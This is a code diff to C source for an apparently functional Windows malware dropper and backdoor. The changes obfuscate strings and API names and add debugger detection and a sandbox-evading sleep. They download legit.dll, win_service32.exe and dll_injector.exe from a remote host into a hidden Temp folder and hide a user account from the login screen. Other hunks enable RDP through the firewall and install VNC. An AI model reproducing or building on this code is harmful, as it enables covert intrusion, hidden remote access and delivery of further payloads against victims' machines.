+    SC_HANDLE hService = open_service_func(hSCManager, full_string_9, SERVICE_START);
     if (hService == NULL) {
-        printf("Failed to open TermService.\n");
+        //printf("Failed to open TermService.\n");
         CloseServiceHandle(hSCManager);
         return;
     }
-	printf("opened TermService.\n");
+	//printf("opened TermService.\n");
 
     if (!start_service_func(hService, 0, NULL)) {
-        printf("Failed to start TermService.\n");
+        //printf("Failed to start TermService.\n");
     } else {
-		printf("TermService started successfully.\n");
+		//printf("TermService started successfully.\n");
     }
 
     close_service_func(hService);
     close_service_func(hSCManager);
 
     // Configure the firewall to allow RDP (port 3389)
-    printf("Configuring firewall to allow RDP...\n");
+    //printf("Configuring firewall to allow RDP...\n");
 	
 	
 	//netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389
@@ -887,7 +1304,7 @@ void en_R_6_P(	FARPROC open_key_reg_func,
 	strcat(full_string_3, part_3_36);
 	
 	
-	printf("full_string_1 -> %s\nfull_string_2 -> %s\nfull_string_3 -> %s\n",full_string_1,full_string_2,full_string_3);
+	//printf("full_string_1 -> %s\nfull_string_2 -> %s\nfull_string_3 -> %s\n",full_string_1,full_string_2,full_string_3);
 	/*
 	system(full_string_1);
 	system(full_string_2);
@@ -898,9 +1315,9 @@ void en_R_6_P(	FARPROC open_key_reg_func,
     int result_2 = system(full_string_2);
     int result_3 = system(full_string_3);
 	if (result_1 == 0 && result_2 == 0 && result_3 == 0) {
-        printf("Firewall configured successfully.\n");
+        //printf("Firewall configured successfully.\n");
     } else {
-        printf("Failed to configure firewall.\n");
+        //printf("Failed to configure firewall.\n");
     }
 }
 
@@ -998,13 +1415,146 @@ void a66_Uz3_r(FARPROC cr_key_reg_func,FARPROC set_key_reg_func,FARPROC close_ke
 	strcat(full_string_2, part_2_6);
 	strcat(full_string_2, part_2_7);
 	
+	
+	// SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList
+	char full_string_3[80];  
+	char part_3_1[] = "S";
+	char part_3_2[] = "O";
+	char part_3_3[] = "F";
+	char part_3_4[] = "T";
+	char part_3_5[] = "W";
+	char part_3_6[] = "A";
+	char part_3_7[] = "R";
+	char part_3_8[] = "E";
+	char part_3_9[] = "\\";
+	char part_3_10[] = "M";
+	char part_3_11[] = "i";
+	char part_3_12[] = "c";
+	char part_3_13[] = "r";
+	char part_3_14[] = "o";
+	char part_3_15[] = "s";
+	char part_3_16[] = "o";
+	char part_3_17[] = "f";
+	char part_3_18[] = "t";
+	char part_3_19[] = "\\";
+	char part_3_20[] = "W";
+	char part_3_21[] = "in";
+	char part_3_22[] = "d"; 
+	char part_3_23[] = "ows";
+	char part_3_24[] = " N";
+	char part_3_25[] = "T\\";
+	char part_3_26[] = "Cu";
+	char part_3_27[] = "rr";
+	char part_3_28[] = "en";
+	char part_3_29[] = "t";
+	char part_3_30[] = "V";
+	char part_3_31[] = "er";
+	char part_3_32[] = "s";
+	char part_3_33[] = "io";
+	char part_3_34[] = "n\\";
+	char part_3_35[] = "Win";
+	char part_3_36[] = "lo";
+	char part_3_37[] = "go";
+	char part_3_38[] = "n\\";
+	char part_3_39[] = "S";
+	char part_3_40[] = "p";
+	char part_3_41[] = "e";
+	char part_3_42[] = "c";
+	char part_3_43[] = "i";
+	char part_3_44[] = "a";
+	char part_3_45[] = "l";
+	char part_3_46[] = "A";
+	char part_3_47[] = "cc";	
+	char part_3_48[] = "o";	
+	char part_3_49[] = "u";	
+	char part_3_50[] = "n";	
+	char part_3_51[] = "t";	
+	char part_3_52[] = "s";	
+	char part_3_53[] = "\\";	
+	char part_3_54[] = "U";	
+	char part_3_55[] = "s";	
+	char part_3_56[] = "er";	
+	char part_3_57[] = "L";	
+	char part_3_58[] = "i";	
+	char part_3_59[] = "st";	
+	strcpy(full_string_3, part_3_1);
+	strcat(full_string_3, part_3_2);
+	strcat(full_string_3, part_3_3);
+	strcat(full_string_3, part_3_4);
+	strcat(full_string_3, part_3_5);
+	strcat(full_string_3, part_3_6);
+	strcat(full_string_3, part_3_7);
+	strcat(full_string_3, part_3_8);
+	strcat(full_string_3, part_3_9);
+	strcat(full_string_3, part_3_10);
+	strcat(full_string_3, part_3_11);
+	strcat(full_string_3, part_3_12);
+	strcat(full_string_3, part_3_13);
+	strcat(full_string_3, part_3_14);
+	strcat(full_string_3, part_3_15);
+	strcat(full_string_3, part_3_16);
+	strcat(full_string_3, part_3_17);
+	strcat(full_string_3, part_3_18);
+	strcat(full_string_3, part_3_19);
+	strcat(full_string_3, part_3_20);
+	strcat(full_string_3, part_3_21);
+	strcat(full_string_3, part_3_22);
+	strcat(full_string_3, part_3_23);
+	strcat(full_string_3, part_3_24);
+	strcat(full_string_3, part_3_25);
+	strcat(full_string_3, part_3_26);
+	strcat(full_string_3, part_3_27);
+	strcat(full_string_3, part_3_28);
+	strcat(full_string_3, part_3_29);
+	strcat(full_string_3, part_3_30);
+	strcat(full_string_3, part_3_31);
+	strcat(full_string_3, part_3_32);
+	strcat(full_string_3, part_3_33);
+	strcat(full_string_3, part_3_34);
+	strcat(full_string_3, part_3_35);
+	strcat(full_string_3, part_3_36);
+	strcat(full_string_3, part_3_37);
+	strcat(full_string_3, part_3_38);
+	strcat(full_string_3, part_3_39);
+	strcat(full_string_3, part_3_40);
+	strcat(full_string_3, part_3_41);
+	strcat(full_string_3, part_3_42);
+	strcat(full_string_3, part_3_43);
+	strcat(full_string_3, part_3_44);
+	strcat(full_string_3, part_3_45);
+	strcat(full_string_3, part_3_46);
+	strcat(full_string_3, part_3_47);
+	strcat(full_string_3, part_3_48);
+	strcat(full_string_3, part_3_49);
+	strcat(full_string_3, part_3_50);
+	strcat(full_string_3, part_3_51);
+	strcat(full_string_3, part_3_52);
+	strcat(full_string_3, part_3_53);
+	strcat(full_string_3, part_3_54);
+	strcat(full_string_3, part_3_55);
+	strcat(full_string_3, part_3_56);
+	strcat(full_string_3, part_3_57);
+	strcat(full_string_3, part_3_58);
+	strcat(full_string_3, part_3_59);
+	
 	HKEY hKey;
 	DWORD dwValue = 0;
-	cr_key_reg_func(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",&hKey);
+	LONG result = cr_key_reg_func(HKEY_LOCAL_MACHINE,full_string_3,&hKey);
 	
+    if (result != ERROR_SUCCESS) {
+        //printf("Failed to open/create registry key. Error: %ld\n", result);
+        return;
+    }
+    result = set_key_reg_func(hKey,full_string_2,0,REG_DWORD,(const BYTE*)&dwValue,sizeof(dwValue));
 	
-	
-	
+    if (result != ERROR_SUCCESS) {
+        //printf("Failed to set registry value. Error: %ld\n", result);
+        close_key_reg_func(hKey);
+        return;
+    }
+
+    //printf("Successfully hid user '%s' from login screen.\n", full_string_2);
+    close_key_reg_func(hKey);
 	return;
 }
 
@@ -1384,18 +1934,41 @@ void Vn_in(){
 	
 	int result = system(full_string_1);
 	if (result == 0) {
-        printf("VNC installed.\n");
+        //printf("VNC installed.\n");
     } else {
-        printf("VNC hasn't installed.\n");
+        //printf("VNC hasn't installed.\n");
     }
 	
 	
 	return;
 }
 
-
+void Chk_DBG(){
+	PPEB pPEB = GetPEB();
+	if (pPEB->BeingDebugged != 0 || pPEB->NtGlobalFlag != 0){
+		//printf("[x] PROGRAM IS BEING DEBUGGED, EXITING!\n");
+		//MessageBoxA(NULL, "[x] PROGRAM IS BEING DEBUGGED, EXITING!", "Title", MB_OK);
+		// CALL DEAD CODE TO EXECUTE
+		exit(1);	//Debug
+	}
+	//printf("[+] NO DEBUGGER PRESENT, CONTINUING!\n");
+	//MessageBoxA(NULL, "[+] NO DEBUGGER PRESENT, CONTINUING!", "Title", MB_OK);
+	
+	//RETURN AND START THE MALWARE
+	//exit(0);	//Debug
+	return;
+}
 
 int main(){
+	
+	
+	
+	Chk_DBG();
+	//Chk_VM();
+	
+	//GetTickCount64();
+	
+	
 	// --- START OFFSETS --- //
 	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};	//CreateToolhelp32Snapshot 
 	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
@@ -1404,7 +1977,8 @@ int main(){
 	int dll_n__t_offset[] = {39,45,29,37,37};
 	int dll_a_DV_offset[] = {0,3,21,0,15,8,55,54,62,3,11,11};
 	int dll_H_11_P_offset[] = {22,8,13,7,19,19,15,62,3,11,11};
-	int dll_d_b_g_offset[] = {3,1,6,7,4,11,15,62,3,11,11};							
+	int dll_d_b_g_offset[] = {3,1,6,7,4,11,15,62,3,11,11};		
+	int dll_inet_offset[] = {48,8,13,8,13,4,19,62,3,11,11};
 	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};						//LoadLibraryA
 	int cr_dir_offset[] = {28,17,4,0,19,4,29,8,17,4,2,19,14,17,24,26};				//CreateDirectoryA
 	int set_file_attr_offset[] = {44,4,19,31,8,11,4,26,19,19,17,8,1,20,19,4,18,26};	//SetFileAttributesA
@@ -1426,16 +2000,39 @@ int main(){
 	int open_SC_offset[] = {40,15,4,13,44,28,38,0,13,0,6,4,17,26};	//OpenSCManagerA
 	int open_service_offset[] = {40,15,4,13,44,4,17,21,8,2,4,26};	//OpenServiceA
 	int start_service_offset[] = {44,19,0,17,19,44,4,17,21,8,2,4,26};	//StartServiceA
-	
 	int close_service_offset[] = {28,11,14,18,4,44,4,17,21,8,2,4,33,0,13,3,11,4}; //CloseServiceHandle
+	int n3t_op3n_offset[] = {34,13,19,4,17,13,4,19,40,15,4,13,26};
+	int n3t_op3n_ur1_offset[] = {34,13,19,4,17,13,4,19,40,15,4,13,46,17,11,26};
+	int n3t_r3ad_f1l3_offset[] = {34,13,19,4,17,13,4,19,43,4,0,3,31,8,11,4};
+	int n3t_cl0s3_hndl3_offset[] = {34,13,19,4,17,13,4,19,28,11,14,18,4,33,0,13,3,11,4};
 	
 	
 	// --- END OFFSETS --- /
 	
 	// --- init variables --- //
 	
+	wchar_t full_string_mod_1[100];	// L"Kernel32"
+	wchar_t part_mod_1_1[] = L"K";
+	wchar_t part_mod_1_2[] = L"e";
+	wchar_t part_mod_1_3[] = L"r";
+	wchar_t part_mod_1_4[] = L"n";
+	wchar_t part_mod_1_5[] = L"e";
+	wchar_t part_mod_1_6[] = L"l";
+	wchar_t part_mod_1_7[] = L"3";
+	wchar_t part_mod_1_8[] = L"2";
+	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
+	wcscpy(full_string_mod_1, part_mod_1_1);
+	wcscat(full_string_mod_1, part_mod_1_2);
+	wcscat(full_string_mod_1, part_mod_1_3);
+	wcscat(full_string_mod_1, part_mod_1_4);
+	wcscat(full_string_mod_1, part_mod_1_5);
+	wcscat(full_string_mod_1, part_mod_1_6);
+	wcscat(full_string_mod_1, part_mod_1_7);
+	wcscat(full_string_mod_1, part_mod_1_8);
+	//printf("size of /shellcode.bin after concat-> %d\n",sizeof(full_string_1));
+	//wprintf(L"%s\n",full_string_1);
+	HMODULE hK32 = Get_Module(full_string_mod_1);
 	
-	HMODULE hK32 = Get_Module(L"Kernel32");
 	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
 	char keys[]={'P','L','S','a','5','p','A','1','w','F'};
 	//SIZE_T magic_size = sizeof(magic);
@@ -1503,6 +2100,16 @@ int main(){
 	//printf("[%s\t0x%p]\n",GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_d_b_g_offset)),hdll_H_11_P);
 	// --- END LOAD Dbghelp DLL ---//
 	
+	// --- START LOAD Wininet.dll DLL --- //
+	HMODULE hdll_inet = L_0_D_LIB(GetOriginal(dll_inet_offset,ALL_ALPHANUM,sizeof(dll_inet_offset)));
+	if (hdll_inet == NULL){
+		//printf("[x] COULD NOT LOAD dbghelp.dll, err -> %lu\n",GetLastError());
+		exit(1);
+	}
+	//printf("[+] Got Handle to module!\n");
+	//printf("[%s\t0x%p]\n",GetOriginal(dll_d_b_g_offset,ALL_ALPHANUM,sizeof(dll_inet_offset)),hdll_inet);
+	// --- END LOAD Wininet.dll DLL ---//
+	
 	
 	
 	//printf("sizeof(NtClose) -> %d\n",sizeof("NtClose"));
@@ -1520,7 +2127,7 @@ int main(){
 	strcat(full_func_1, part_func_1_4);
 	strcat(full_func_1, part_func_1_5);
 	strcat(full_func_1, part_func_1_6);
-	printf("%s\n",full_func_1);
+	//printf("%s\n",full_func_1);
 	
 	//printf("sizeof(NtOpenMutant) -> %d\n",sizeof("NtOpenMutant"));
 
@@ -1547,7 +2154,7 @@ int main(){
 	strcat(full_func_2, part_func_2_10);
 	
 	
-	printf("%s\n",full_func_2);
+	//printf("%s\n",full_func_2);
 	
 	//printf("sizeof(NtCreateMutant) -> %d\n",sizeof("NtCreateMutant"));
 
@@ -1574,7 +2181,7 @@ int main(){
 	strcat(full_func_3, part_func_3_10);
 	
 	
-	printf("%s\n",full_func_3);
+	//printf("%s\n",full_func_3);
 	
 	
 	
@@ -1584,15 +2191,16 @@ int main(){
 	//printf("[+] populating prototypes...\n");
 	//NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
 	//NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
-	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
+	//NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
 	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, full_func_1);
-	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
-	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
-	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
-	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
-	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
+	//NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
+	//NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
+	//NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
+	//NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
+	//NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
 	NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,full_func_2);
 	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,full_func_3);
+	NtDelayExecution NT_DelayExecution = (NtDelayExecution)GetProcAddress(hDLL_n__t,"NtDelayExecution");
 	//NtCreateFile NT_CreateFile = (NtCreateFile)GetProcAddress(hDLL_n__t,"NtCreateFile");
 	//NtWriteFile NT_WriteFile = (NtWriteFile)GetProcAddress(hDLL_n__t,"NtWriteFile");
 	//FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
@@ -1614,6 +2222,12 @@ int main(){
 	FARPROC h_11_p_query_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_query_offset,ALL_ALPHANUM,sizeof(h_11_p_query_offset))); //WinHttpQueryDataAvailable
 	FARPROC h_11_p_read_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_read_offset,ALL_ALPHANUM,sizeof(h_11_p_read_offset))); //WinHttpReadData
 	FARPROC h_11_p_close_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_close_offset,ALL_ALPHANUM,sizeof(h_11_p_close_offset))); //WinHttpCloseHandle
+	
+	FARPROC n3t_op3n_func = GetProcAddress(hdll_inet,GetOriginal(n3t_op3n_offset,ALL_ALPHANUM,sizeof(n3t_op3n_offset))); //InternetOpenA
+	FARPROC n3t_op3n_ur1_func = GetProcAddress(hdll_inet,GetOriginal(n3t_op3n_ur1_offset,ALL_ALPHANUM,sizeof(n3t_op3n_ur1_offset))); //InternetOpenUrlA
+	FARPROC n3t_r3ad_f1l3_func = GetProcAddress(hdll_inet,GetOriginal(n3t_r3ad_f1l3_offset,ALL_ALPHANUM,sizeof(n3t_r3ad_f1l3_offset))); //InternetReadFile
+	FARPROC n3t_cl0s3_hndl3_func = GetProcAddress(hdll_inet,GetOriginal(n3t_cl0s3_hndl3_offset,ALL_ALPHANUM,sizeof(n3t_cl0s3_hndl3_offset))); //InternetCloseHandle
+
 	//FARPROC wr_dmp_func = GetProcAddress(hdll_d_b_g,GetOriginal(wr_dmp_offset,ALL_ALPHANUM,sizeof(wr_dmp_offset))); //MiniDumpWriteDump
 	FARPROC open_SC_func = GetProcAddress(hdll_a_DV,GetOriginal(open_SC_offset,ALL_ALPHANUM,sizeof(open_SC_offset))); //OpenSCManagerA
 	FARPROC open_service_func = GetProcAddress(hdll_a_DV,GetOriginal(open_service_offset,ALL_ALPHANUM,sizeof(open_service_offset)));	//OpenServicA
@@ -1624,6 +2238,8 @@ int main(){
 	// --- END FUNCTION PROTOTYPES INIT --- //
 	
 	
+
+	
 	
 	// --- START CREATE MUTEX --- //
 	HANDLE hMux = NULL;
@@ -1633,10 +2249,15 @@ int main(){
 	Object_Attr_mutant.ObjectName = &MutantName;
 	hMux=m_stuff(NT_OpenMutant,NT_CreateMutant,hMux,&Object_Attr_mutant);
 	// --- END CREATE MUTEX --- //
-	
-	printf("[+] entering rdp function\n");
-	en_R_6_P(open_key_reg_func,set_key_reg_func,close_key_reg_func,open_SC_func,open_service_func,start_service_func,close_service_func); //enable rdp
-	return 0;
+
+
+	LARGE_INTEGER sleepInterval;
+	sleepInterval.QuadPart = -3600000000LL; // 6 minutes (360 seconds) in 100-ns units
+	//printf("[+] BEGIN SLEEP\n");
+	NT_DelayExecution(FALSE, &sleepInterval);
+	//printf("[+]sleep done\n");
+	//return 0;
+
 	
 	// --- START FILE/NET OPS --- //
 	char full_string_1[55];  //	C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa
@@ -1684,6 +2305,44 @@ int main(){
 	strcat(full_string_1, part_1_21);
 	
 	//printf("%s\n",full_string_1);
+	
+	char full_string_n3t[100];  //http://192.168.100.5:8000/
+	char part_n3t_1[] = "h";
+	char part_n3t_2[] = "t";
+	char part_n3t_3[] = "tp";
+	char part_n3t_4[] = ":";
+	char part_n3t_5[] = "//";
+	char part_n3t_6[] = "1";
+	char part_n3t_7[] = "9";
+	char part_n3t_8[] = "2";
+	char part_n3t_9[] = ".1";
+	char part_n3t_10[] = "6";
+	char part_n3t_11[] = "8.";
+	char part_n3t_12[] = "1";
+	char part_n3t_13[] = "00.";
+	char part_n3t_14[] = "5";
+	char part_n3t_15[] = ":";
+	char part_n3t_16[] = "8";
+	char part_n3t_17[] = "000";
+	char part_n3t_18[] = "/";
+	strcpy(full_string_n3t, part_n3t_1);
+	strcat(full_string_n3t, part_n3t_2);
+	strcat(full_string_n3t, part_n3t_3);
+	strcat(full_string_n3t, part_n3t_4);
+	strcat(full_string_n3t, part_n3t_5);
+	strcat(full_string_n3t, part_n3t_6);
+	strcat(full_string_n3t, part_n3t_7);
+	strcat(full_string_n3t, part_n3t_8);
+	strcat(full_string_n3t, part_n3t_9);
+	strcat(full_string_n3t, part_n3t_10);
+	strcat(full_string_n3t, part_n3t_11);
+	strcat(full_string_n3t, part_n3t_12);
+	strcat(full_string_n3t, part_n3t_13);
+	strcat(full_string_n3t, part_n3t_14);
+	strcat(full_string_n3t, part_n3t_15);
+	strcat(full_string_n3t, part_n3t_16);
+	strcat(full_string_n3t, part_n3t_17);
+	strcat(full_string_n3t, part_n3t_18);
 
 	
 
@@ -1711,34 +2370,33 @@ int main(){
 	} 
 	else{
 		//printf("Failed to set folder as hidden. Error code: %lu\n", GetLastError());
-		//return 1;
+		return 1;
 	}
 	
+
 	
-	/*
-	wchar_t full_string_5[10];	// L"/legit.dll"
-	wchar_t part_5_1[] = L"/";
-	wchar_t part_5_2[] = L"l";
-	wchar_t part_5_3[] = L"e";
-	wchar_t part_5_4[] = L"g";
-	wchar_t part_5_5[] = L"i";
-	wchar_t part_5_6[] = L"t";
-	wchar_t part_5_7[] = L".";
-	wchar_t part_5_8[] = L"d";
-	wchar_t part_5_9[] = L"ll";
-	//printf("size of /legit.dll -> %d\n",sizeof(L"legit.dll"));
-	wcscpy(full_string_5, part_5_1);
-	wcscat(full_string_5, part_5_2);
-	wcscat(full_string_5, part_5_3);
-	wcscat(full_string_5, part_5_4);
-	wcscat(full_string_5, part_5_5);
-	wcscat(full_string_5, part_5_6);
-	wcscat(full_string_5, part_5_7);
-	wcscat(full_string_5, part_5_8);
-	wcscat(full_string_5, part_5_9);
-	//printf("size of /legit.dll after concat-> %d\n",sizeof(full_string_5));
-	//wprintf(L"%s\n",full_string_5);
 	
+	char full_string_5[10];	// "legit.dll"
+	char part_5_1[] = "";
+	char part_5_2[] = "l";
+	char part_5_3[] = "e";
+	char part_5_4[] = "g";
+	char part_5_5[] = "i";
+	char part_5_6[] = "t";
+	char part_5_7[] = ".";
+	char part_5_8[] = "d";
+	char part_5_9[] = "l";
+	char part_5_10[] = "l";
+	strcpy(full_string_5, part_5_1);
+	strcat(full_string_5, part_5_2);
+	strcat(full_string_5, part_5_3);
+	strcat(full_string_5, part_5_4);
+	strcat(full_string_5, part_5_5);
+	strcat(full_string_5, part_5_6);
+	strcat(full_string_5, part_5_7);
+	strcat(full_string_5, part_5_8);
+	strcat(full_string_5, part_5_9);
+	strcat(full_string_5, part_5_10);
 	
 	
 	
@@ -1772,48 +2430,35 @@ int main(){
 	//printf("%s\n",full_string_7);
 	//wprintf(L"%s\n",file_path_1);
 
+	char full_string_n3t_1[110]; //http://192.168.100.5:8000/legit.dll
+	strcpy(full_string_n3t_1,full_string_n3t);
+	strcat(full_string_n3t_1,full_string_5);
+
 	
-	LPCWSTR file_path_2 = full_string_5;
-	netops(file_path_2,h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func);
-   	for (int i = 0; i < sizeof(keys); i++){
-		decrypt(magic,sizeof(magic),keys[i]);
-	}
-	fileops(full_string_7,cr_file_func,wr_file_func);
+	dw_ff1e1(full_string_n3t_1, full_string_7,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
+
 	
-	*/
-	
-	
-	
-	
-	wchar_t full_string_8[36/2];	// L"/win_service32.exe"
-	wchar_t part_8_1[] = L"/";
-	wchar_t part_8_2[] = L"w";
-	wchar_t part_8_3[] = L"i";
-	wchar_t part_8_4[] = L"n";
-	wchar_t part_8_5[] = L"_";
-	wchar_t part_8_6[] = L"se";
-	wchar_t part_8_7[] = L"rv";
-	wchar_t part_8_8[] = L"ic";
-	wchar_t part_8_9[] = L"e3";
-	wchar_t part_8_10[] = L"2";
-	wchar_t part_8_11[] = L".e";
-	wchar_t part_8_12[] = L"xe";
-	//printf("size of /win_service32.exe -> %d\n",sizeof(L"win_service32.exe"));
-	wcscpy(full_string_8, part_8_1);
-	wcscat(full_string_8, part_8_2);
-	wcscat(full_string_8, part_8_3);
-	wcscat(full_string_8, part_8_4);
-	wcscat(full_string_8, part_8_5);
-	wcscat(full_string_8, part_8_6);
-	wcscat(full_string_8, part_8_7);
-	wcscat(full_string_8, part_8_8);
-	wcscat(full_string_8, part_8_9);
-	wcscat(full_string_8, part_8_10);
-	wcscat(full_string_8, part_8_11);
-	wcscat(full_string_8, part_8_12);
-	//printf("size of /win_service32.exe after concat-> %d\n",sizeof(full_string_8));
-	//wprintf(L"%s\n",full_string_8);
-	
+	char full_string_8[20];	// "win_service32.exe"
+	char part_8_1[] = "";
+	char part_8_2[] = "w";
+	char part_8_3[] = "in";
+	char part_8_4[] = "_se";
+	char part_8_5[] = "rv";
+	char part_8_6[] = "ice3";
+	char part_8_7[] = "2.";
+	char part_8_8[] = "e";
+	char part_8_9[] = "x";
+	char part_8_10[] = "e";
+	strcpy(full_string_8, part_8_1);
+	strcat(full_string_8, part_8_2);
+	strcat(full_string_8, part_8_3);
+	strcat(full_string_8, part_8_4);
+	strcat(full_string_8, part_8_5);
+	strcat(full_string_8, part_8_6);
+	strcat(full_string_8, part_8_7);
+	strcat(full_string_8, part_8_8);
+	strcat(full_string_8, part_8_9);
+	strcat(full_string_8, part_8_10);
 	
 	
 	
@@ -1848,51 +2493,33 @@ int main(){
 	//printf("sizeof(\"\\win_service32.exe\") -> %d\n",sizeof("\\win_service32.exe"));
 	//printf("%s\n",full_string_10);
 	
-	DWORD actual_data = 0;
-	LPCWSTR file_path_4 = full_string_8;
-	//netops(full_string_8,h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func,&actual_data);
-   DownloadFile("http://192.168.100.5:8000/win_service32.exe", full_string_8);
-	
-	fileops(full_string_10,cr_file_func,wr_file_func);
 
+	char full_string_n3t_2[110]; //http://192.168.100.5:8000/win_service32.exe
+	strcpy(full_string_n3t_2,full_string_n3t);
+	strcat(full_string_n3t_2,full_string_8);
+	dw_ff1e1(full_string_n3t_2,full_string_10,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 
-	return 0;
-
-	
-	
-
-
-
-	
-	wchar_t full_string_11[34/2];	// L"/dll_injector.exe"
-	wchar_t part_11_1[] = L"/";
-	wchar_t part_11_2[] = L"d";
-	wchar_t part_11_3[] = L"ll";
-	wchar_t part_11_4[] = L"_in";
-	wchar_t part_11_5[] = L"j";
-	wchar_t part_11_6[] = L"e";
-	wchar_t part_11_7[] = L"c";
-	wchar_t part_11_8[] = L"to";
-	wchar_t part_11_9[] = L"r.";
-	wchar_t part_11_10[] = L"e";
-	wchar_t part_11_11[] = L"x";
-	wchar_t part_11_12[] = L"e";
-	//printf("size of /dll_injector.exe -> %d\n",sizeof(L"dll_injector.exe"));
-	wcscpy(full_string_11, part_11_1);
-	wcscat(full_string_11, part_11_2);
-	wcscat(full_string_11, part_11_3);
-	wcscat(full_string_11, part_11_4);
-	wcscat(full_string_11, part_11_5);
-	wcscat(full_string_11, part_11_6);
-	wcscat(full_string_11, part_11_7);
-	wcscat(full_string_11, part_11_8);
-	wcscat(full_string_11, part_11_9);
-	wcscat(full_string_11, part_11_10);
-	wcscat(full_string_11, part_11_11);
-	wcscat(full_string_11, part_11_12);
-	//printf("size of /dll_injector.exe after concat-> %d\n",sizeof(full_string_11));
-	//wprintf(L"%s\n",full_string_11);
-	
+	char full_string_11[20];	// "dll_injector.exe"
+	char part_11_1[] = "";
+	char part_11_2[] = "d";
+	char part_11_3[] = "ll";
+	char part_11_4[] = "_in";
+	char part_11_5[] = "jec";
+	char part_11_6[] = "to";
+	char part_11_7[] = "r.";
+	char part_11_8[] = "e";
+	char part_11_9[] = "x";
+	char part_11_10[] = "e";
+	strcpy(full_string_11, part_11_1);
+	strcat(full_string_11, part_11_2);
+	strcat(full_string_11, part_11_3);
+	strcat(full_string_11, part_11_4);
+	strcat(full_string_11, part_11_5);
+	strcat(full_string_11, part_11_6);
+	strcat(full_string_11, part_11_7);
+	strcat(full_string_11, part_11_8);
+	strcat(full_string_11, part_11_9);
+	strcat(full_string_11, part_11_10);
 	
 	
 	//printf("size of /dll_injector.exe -> %d\n",sizeof("\\dll_injector.exe"));
@@ -1908,6 +2535,7 @@ int main(){
 	char part_12_9[] = "x";
 	char part_12_10[] = "e";
 	//printf("%s\n",full_string_12);
+
 	
 	char full_string_13[55+18];	//	"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\dll_injector.exe"
 	strcpy(full_string_13,full_string_1);
@@ -1930,19 +2558,13 @@ int main(){
 	
 	
 	
-	LPCWSTR file_path_5 = full_string_11;
-	//netops(full_string_11,h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func);
-   /*
-	for (int i = 0; i < sizeof(keys); i++){
-		decrypt(magic,sizeof(magic),keys[i]);
-	}
-	*/
-	
-	//fileops(full_string_13,cr_file_func,wr_file_func);
-	//return 0;
+	char full_string_n3t_3[110]; //http://192.168.100.5:8000/dll_injector.exe
+	strcpy(full_string_n3t_3,full_string_n3t);
+	strcat(full_string_n3t_3,full_string_12);
+	dw_ff1e1(full_string_n3t_3, full_string_13,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 	
 	
-	
+	/*
 	wchar_t full_string_14[20/2];	// L"/tightVNC.msi"
